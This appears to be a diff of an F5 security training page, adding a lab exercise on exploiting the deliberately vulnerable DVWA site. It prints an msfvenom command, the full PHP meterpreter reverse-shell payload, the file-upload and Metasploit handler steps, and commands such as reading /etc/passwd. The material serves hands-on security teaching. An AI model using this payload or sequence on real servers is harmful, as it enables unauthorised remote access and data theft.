@@ -5,7 +5,7 @@
   <head>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     
-    <title>2.1.2. Lab – Install a BIG-IP Virtual Edition image on a Hypervisor &#8212; Pwn like a Hacker; Protect like a Pro  documentation</title>
+    <title>2.1.2.2. Exercise 2: Exploiting a Web Server &#8212; Pwn like a Hacker; Protect like a Pro  documentation</title>
     
     <link rel="stylesheet" href="../../_static/css/bootstrap.min.css" type="text/css" />
     <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
@@ -28,8 +28,8 @@
     <script type="text/javascript" src="../../_static/doctools.js"></script>
     <link rel="index" title="Index" href="../../genindex.html" />
     <link rel="search" title="Search" href="../../search.html" />
-    <link rel="next" title="2.2. Module – Installing a BIG-IP Appliance" href="../module2/module2.html" />
-    <link rel="prev" title="2.1.1. Lab – Download the BIG-IP Virtual Edition Image" href="lab1.html" />
+    <link rel="next" title="2.1.2.4. Exercise 3: Metasploit Utilities" href="lab3.html" />
+    <link rel="prev" title="2.1.2.1. Exercise 1 : Scanning the Network" href="lab1.html" />
 <!--
 # Copyright 2017 F5 Networks
 #
@@ -212,11 +212,12 @@
    <span class="caption-text">Current Page</span>
   </p>
   <ul>
-<li><a class="reference internal" href="#">2.1.2. Lab – Install a BIG-IP Virtual Edition image on a Hypervisor</a><ul>
-<li><a class="reference internal" href="#task-upload-the-image-to-your-hypervisor">2.1.2.1. Task – Upload the image to your Hypervisor</a></li>
-<li><a class="reference internal" href="#task-start-a-bip-ve-instance">2.1.2.2. Task – Start a BIG-IP Virtual Edition Instance</a></li>
+<li><a class="reference internal" href="#">2.1.2.2. Exercise 2: Exploiting a Web Server</a><ul>
+<li><a class="reference internal" href="#lhost-and-lport">2.1.2.2.1. lhost and lport</a></li>
+<li><a class="reference internal" href="#exploit">2.1.2.2.2. exploit</a></li>
 </ul>
 </li>
+<li><a class="reference internal" href="#meterpreter">2.1.2.3. Meterpreter</a></li>
 </ul>
 
 
@@ -224,20 +225,17 @@
 <ul class="current">
 <li class="toctree-l1"><a class="reference internal" href="../../intro.html">1. Getting Started</a></li>
 <li class="toctree-l1 current"><a class="reference internal" href="../class1.html">2. Class - Pwn like a Hacker; Protect like a Pro</a><ul class="current">
-<li class="toctree-l2 current"><a class="reference internal" href="module1.html">2.1. Module – Installing a BIG-IP Virtual Edition</a></li>
-<li class="toctree-l2"><a class="reference internal" href="../module2/module2.html">2.2. Module – Installing a BIG-IP Appliance</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="../class1.html#class-environment">2.1. Class Environment:</a></li>
 </ul>
 </li>
-<li class="toctree-l1"><a class="reference internal" href="../../examples.html">3. Examples of Common Formatting</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../../markdown.html">4. Markdown files are also supported</a></li>
 </ul>
 
   <h4>Previous topic</h4>
   <p class="topless"><a href="lab1.html"
-                        title="previous chapter">2.1.1. Lab – Download the BIG-IP Virtual Edition Image</a></p>
+                        title="previous chapter">2.1.2.1. Exercise 1 : Scanning the Network</a></p>
   <h4>Next topic</h4>
-  <p class="topless"><a href="../module2/module2.html"
-                        title="next chapter">2.2. Module – Installing a BIG-IP Appliance</a></p>
+  <p class="topless"><a href="lab3.html"
+                        title="next chapter">2.1.2.4. Exercise 3: Metasploit Utilities</a></p>
         
       </div>
       <div class="col-md-offset-3 col-sm-offset-3 main">
@@ -246,50 +244,172 @@
           <span class="right"><a href="../../genindex.html">Index</a></span>
         </h4>
         
-  <div class="section" id="lab-install-a-bip-ve-image-on-a-hypervisor">
-<h1>2.1.2. Lab – Install a BIG-IP Virtual Edition image on a Hypervisor<a class="headerlink" href="#lab-install-a-bip-ve-image-on-a-hypervisor" title="Permalink to this headline">¶</a></h1>
-<div class="admonition-todo admonition" id="index-0">
-<p class="first admonition-title">Todo</p>
-<p class="last">Needs lab description</p>
+  <div class="section" id="exercise-2-exploiting-a-web-server">
+<h1>2.1.2.2. Exercise 2: Exploiting a Web Server<a class="headerlink" href="#exercise-2-exploiting-a-web-server" title="Permalink to this headline">¶</a></h1>
+<p>This exploit uses some of the basic functions of the DVWA web site to
+demonstrate how to hack through the site itself. A hacker would use this
+as a means of circumventing your perimeter to gain access to your
+applications, servers and data.</p>
+<p>We will start by creating a pre-canned piece of php code that we will
+upload to the web server through the upload function on DVWA. For this
+exercise you will need to locate the external IP for your Kali server.
+This IP is generated dynamically for each student but we have written a
+script and an iRule on the CTF server to return the IP address you’ll
+need.</p>
+<p>On the Kali server, run the following:</p>
+<p>msfvenom -p php/meterpreter/reverse_tcp lport=4444 -f raw lhost=`curl
+-k <a class="reference external" href="https://ctf.f5lab.biz/whatismyip">https://ctf.f5lab.biz/whatismyip</a>`</p>
+<p>% Total % Received % Xferd Average Speed Time Time Time Current</p>
+<p>Dload Upload Total Spent Left Speed</p>
+<p>100 14 100 14 0 0 492 0 –:–:– –:–:– –:–:– 518</p>
+<p>No platform was selected, choosing Msf::Module::Platform::PHP from the
+payload</p>
+<p>No Arch selected, selecting Arch: php from the payload</p>
+<p>No encoder or badchars specified, outputting raw payload</p>
+<p>Payload size: 950 bytes</p>
+<p>/*&lt;?php /**/ error_reporting(0); $ip = ‘&lt;YOUR-IP&gt;’; $port = 4444; if
+(($f = ‘stream_socket_client’) &amp;&amp; is_callable($f)) { $s =
+$f(“<a class="reference external" href="tcp:/">tcp:/</a>/{$ip}:{$port}”); $s_type = ‘stream’; } elseif (($f =
+‘fsockopen’) &amp;&amp; is_callable($f)) { $s = $f($ip, $port); $s_type =
+‘stream’; } elseif (($f = ‘socket_create’) &amp;&amp; is_callable($f)) { $s =
+$f(AF_INET, SOCK_STREAM, SOL_TCP); $res = &#64;socket_connect($s, $ip,
+$port); if (!$res) { die(); } $s_type = ‘socket’; } else { die(‘no
+socket funcs’); } if (!$s) { die(‘no socket’); } switch ($s_type) {
+case ‘stream’: $len = fread($s, 4); break; case ‘socket’: $len =
+socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(“Nlen”,
+$len); $len = $a[‘len’]; $b = ”; while (strlen($b) &lt; $len) { switch
+($s_type) { case ‘stream’: $b .= fread($s, $len-strlen($b)); break;
+case ‘socket’: $b .= socket_read($s, $len-strlen($b)); break; } }
+$GLOBALS[‘msgsock’] = $s; $GLOBALS[‘msgsock_type’] = $s_type;
+eval($b); die();</p>
+<p>Highlight the section of code that was generated – from the “/*&lt;?php”
+to the end “die;”</p>
+<p>Open a Command prompt on the Windows PC. In the command prompt type:</p>
+<p>CD Desktop</p>
+<p>Notepad hackdvwa.php</p>
+<img alt="../../_images/cmd1.png" src="../../_images/cmd1.png" />
+<p>In Notepad, paste the copied code and Save and Close the file.</p>
+<img alt="../../_images/notepad.png" src="../../_images/notepad.png" />
+<p>Open a Web Browser and go to <a class="reference external" href="https://dvwa.vlab.f5demo.com">https://dvwa.vlab.f5demo.com</a></p>
+<p>Log in with admin / password</p>
+<p>Choose the Upload menu on the lower left</p>
+<img alt="../../_images/dvwa.png" src="../../_images/dvwa.png" />
+<p>Click ‘Choose File’ and select the hackdvwa.php file you just created on
+the Desktop and click ‘Upload’</p>
+<img alt="../../_images/explorer.png" src="../../_images/explorer.png" />
+<img alt="../../_images/upload.png" src="../../_images/upload.png" />
+<p>The file is then posted to the server and the location is displayed for
+you as a means of confirmation. You can copy this and paste it at the
+end of the URL in the browser.</p>
+<p>In the browser, visit that file’s location:
+<a class="reference external" href="http://dvwa.vlab.f5demo.com/hackable/uploads/hackdvwa.php">http://dvwa.vlab.f5demo.com/hackable/uploads/hackdvwa.php</a></p>
+<p>This will actually fail and you should see a “no socket” message, but
+we’ll set that up next.</p>
+<p>Back to the Kali ssh session we will set up the server to connect to
+from the web server.</p>
+<p>If you’re not within msfconsole anymore, start it:</p>
+<p>msfconsole</p>
+<p>Now we want to choose an exploit to run.</p>
+<p>use exploit/multi/handler</p>
+<p>To see what is selected for this exploit by default, type:</p>
+<p>options</p>
+<p>Module options (exploit/multi/handler):</p>
+<p>Name Current Setting Required Description</p>
+<p>—- ————— ——– ———–</p>
+<p>Exploit target:</p>
+<p>Id Name</p>
+<p>– —-</p>
+<p>0 Wildcard Target</p>
+<p>this selects the exploit we’ll run in Metasploit</p>
+<p>set payload php/meterpreter/reverse_tcp</p>
+<p>To see the options for this payload, type:</p>
+<p>options</p>
+<p>Module options (exploit/multi/handler):</p>
+<p>Name Current Setting Required Description</p>
+<p>—- ————— ——– ———–</p>
+<p>Payload options (php/meterpreter/reverse_tcp):</p>
+<p>Name Current Setting Required Description</p>
+<p>—- ————— ——– ———–</p>
+<p>LHOST yes The listen address</p>
+<p>LPORT 4444 yes The listen port</p>
+<p>Exploit target:</p>
+<p>Id Name</p>
+<p>– —-</p>
+<p>0 Wildcard Target</p>
+<p>This chooses the actual payload we’re going to send through the exploit
+and we’ll set some parameters. To see the options:</p>
+<p>show options</p>
+<p>msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp</p>
+<p>payload =&gt; php/meterpreter/reverse_tcp</p>
+<p>msf exploit(handler) &gt; show options</p>
+<p>Module options (exploit/multi/handler):</p>
+<p>Name Current Setting Required Description</p>
+<p>—- ————— ——– ———–</p>
+<p>Payload options (php/meterpreter/reverse_tcp):</p>
+<p>Name Current Setting Required Description</p>
+<p>—- ————— ——– ———–</p>
+<p>LHOST yes The listen address</p>
+<p>LPORT 4444 yes The listen port</p>
+<p>Exploit target:</p>
+<p>Id Name</p>
+<p>– —-</p>
+<p>0 Wildcard Target</p>
+<p>Set the options as follows:</p>
+<p>set lhost 10.1.10.240</p>
+<p>set lport 4444</p>
+<div class="section" id="lhost-and-lport">
+<h2>2.1.2.2.1. lhost and lport<a class="headerlink" href="#lhost-and-lport" title="Permalink to this headline">¶</a></h2>
+<p>These options are the ‘local’ listening IP and port for the exploit.
+Note that the IP here is the internal NAT’d IP address. In the above php
+code you entered the External NAT’d address.</p>
+<p>Return to your web browser on the Windows PC and refresh the page.</p>
+<p>Now we can start the server:</p>
+<p>exploit</p>
 </div>
-<p>In the previous lab we learned how to download the BIG-IP Virtual Edition image.  Now, we
-can install the image onto a hypervisor.</p>
-<div class="section" id="task-upload-the-image-to-your-hypervisor">
-<h2>2.1.2.1. Task – Upload the image to your Hypervisor<a class="headerlink" href="#task-upload-the-image-to-your-hypervisor" title="Permalink to this headline">¶</a></h2>
-<div class="admonition-todo admonition" id="index-1">
-<p class="first admonition-title">Todo</p>
-<p class="last">Needs task description</p>
+<div class="section" id="exploit">
+<h2>2.1.2.2.2. exploit<a class="headerlink" href="#exploit" title="Permalink to this headline">¶</a></h2>
+<p>Exploit is the fun command… here we are running the exploit we want to
+see. You can also use ‘run’ but exploit is so much more Hacker.</p>
+<p>After a few seconds, you should see:</p>
+<p>[*] Started reverse TCP handler on 10.1.10.240:4444</p>
+<p>[*] Starting the payload handler…</p>
+<p>[*] Sending stage (33986 bytes) to &lt;YOURIP&gt;</p>
+<p>[*] Meterpreter session 3 opened (10.1.10.240:4444 -&gt; &lt;IP&gt;:PORT) at
+&lt;Date&gt;</p>
+<p>And then a moment or two later:</p>
+<p>meterpreter &gt;</p>
 </div>
-<p>In this task you will upload the image to your hypervisor.</p>
-<p>Follow these steps to complete this task:</p>
-<ol class="task-stepsx arabic">
-<li><p class="first">Open your hypervisor management console</p>
-</li>
-<li><p class="first">Figure out how to upload the image</p>
-<div class="admonition error">
-<p class="first admonition-title">Error</p>
-<p class="last">These are bad instructions…</p>
 </div>
-</li>
-<li><p class="first">Great!  You’re done</p>
-</li>
-</ol>
-</div>
-<div class="section" id="task-start-a-bip-ve-instance">
-<h2>2.1.2.2. Task – Start a BIG-IP Virtual Edition Instance<a class="headerlink" href="#task-start-a-bip-ve-instance" title="Permalink to this headline">¶</a></h2>
-<div class="admonition-todo admonition" id="index-2">
-<p class="first admonition-title">Todo</p>
-<p class="last">Needs task description</p>
-</div>
-<p>In this task we will start and instance of BIG-IP using the image uploaded in
-the previous task.</p>
-<p>Follow these steps to complete this task:</p>
-<ol class="arabic simple">
-<li>Open your hypervisor management console</li>
-<li>Click the BIG-IP image</li>
-<li>Click the ‘Start’ button (or it’s equivalent)</li>
-</ol>
-</div>
+<div class="section" id="meterpreter">
+<h1>2.1.2.3. Meterpreter<a class="headerlink" href="#meterpreter" title="Permalink to this headline">¶</a></h1>
+<p>Meterpreter is the “Swiss Army Knife” of the Metasploit Framework. You
+can open a meterpreter console up through an exploit, like we just did.
+In this case, we set up Metasploit to listen for incoming traffic on
+port 4444 on our NAT’d internet address. We had to do this because the
+DMZ address isn’t accessible by the Web Server but it is allowed to
+connect to the internet. We then run the uploaded php code we generated
+which opens the connection and now we’re able to run commands on the web
+server as though we had an ssh-like connection.</p>
+<p>Let’s examine the web server so see what we can find.</p>
+<p>In the Meterpreter shell type:</p>
+<p>dir</p>
+<p>We can the following:</p>
+<p>meterpreter &gt; dir</p>
+<p>Listing: /var/www/dvwa/hackable/uploads</p>
+<hr class="docutils" />
+<p>Mode Size Type Last modified Name</p>
+<p>—- —- —- ————- —-</p>
+<p>100644/rw-r–r– 667 fil 2013-07-08 12:55:06 -0400 dvwa_email.png</p>
+<p>100644/rw-r–r– 950 fil 2017-06-19 09:11:52 -0400 hackdvwa.php</p>
+<p>100644/rw-r–r– 951 fil 2017-06-14 13:50:15 -0400 hackme.php.txt</p>
+<p>We can see what accounts are on this server by typing:</p>
+<p>cat /etc/passwd</p>
+<p>To see a list of the commands that are available to you, you can type
+<em>help</em> at any point</p>
+<p>Feel free to investigate the web server, when you’re finished type
+<em>exit</em> and the Meterpreter shell will close.</p>
+<p>Note that when you close the session, the web page finally ends
+spinning.</p>
 </div>
 
 
@@ -297,10 +417,10 @@ the previous task.</p>
 		     <div class="row next-prev-btn-row">
            <div class="col-lg-12">
            
-		        <a href="lab1.html" title="2.1.1. Lab – Download the BIG-IP Virtual Edition Image" accesskey="p" class="btn btn-primary pull-left"><i class="fa fa-arrow-circle-left" aria-hidden="true"></i> Previous</a>
+		        <a href="lab1.html" title="2.1.2.1. Exercise 1 : Scanning the Network" accesskey="p" class="btn btn-primary pull-left"><i class="fa fa-arrow-circle-left" aria-hidden="true"></i> Previous</a>
            
            
-              <a href="../module2/module2.html" title="2.2. Module – Installing a BIG-IP Appliance" accesskey="n" class="btn btn-primary pull-right">Next <i class="fa fa-arrow-circle-right" aria-hidden="true"></i></a>
+              <a href="lab3.html" title="2.1.2.4. Exercise 3: Metasploit Utilities" accesskey="n" class="btn btn-primary pull-right">Next <i class="fa fa-arrow-circle-right" aria-hidden="true"></i></a>
            
 		     </div>
          </div>
